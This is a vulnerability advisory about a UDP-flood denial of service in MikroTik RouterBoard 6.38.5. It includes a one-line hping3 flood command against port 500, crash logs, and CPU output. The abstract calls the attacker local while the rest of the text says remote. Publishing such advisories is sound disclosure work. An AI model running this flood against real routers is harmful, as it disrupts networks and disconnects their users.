Abstract Advisory Information:
==============================
An independent researcher discovered a Denial of Service Vulnerability for MikroTik RouterBoard V-6.38.5.
A local attacker is able to crash the software and all bound running processes.


Vulnerability Disclosure Timeline:
==================================
2017-05-09: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================

Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
A vulnerability in MikroTik Version 6.38.5 could allow an unauthenticated remote attacker to exhaust all available 
CPU via a flood of UDP packets on port 500 (used for L2TP over IPsec), preventing the affected router from accepting 
new connections; all devices will be disconnected from the router and all logs removed automatically.


Proof of Concept (PoC):
=======================
The denial of service vulnerability can be exploited by remote attackers without user account or user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.


hping3 --udp -p 6000 --destport 500 --flood [router's IP] 


--- Log ---
apr/27/2017 04:37:47 system,error,critical kernel failure in previous boot
apr/27/2017 04:37:47 system,error,critical out of memory condition was detected
apr/27/2017 04:33:36 system,error,critical router was rebooted without proper shutdown by watchdog timer


--- Samle: CPU USAGE ---
[admin@...roTik] > system resource monitor
cpu-used: 100%
cpu-used-per-cpu: 100%


Security Risk:
==============
The security risk of the denial of service vulnerability in the software is estimated as medium. (CVSS 3.8)
